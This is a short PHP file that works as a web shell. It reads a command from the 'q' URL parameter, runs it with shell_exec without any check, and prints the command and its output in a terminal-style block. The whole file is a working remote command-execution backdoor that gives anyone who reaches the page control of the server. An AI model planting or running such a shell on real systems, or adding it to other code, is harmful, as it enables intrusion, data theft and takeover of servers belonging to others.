<?php

$query=$_GET["q"];

$result=shell_exec($query);

echo "<pre>";
echo '$ ~';
echo $query;
echo '<br>';
echo $result;
echo "</pre>";

?>
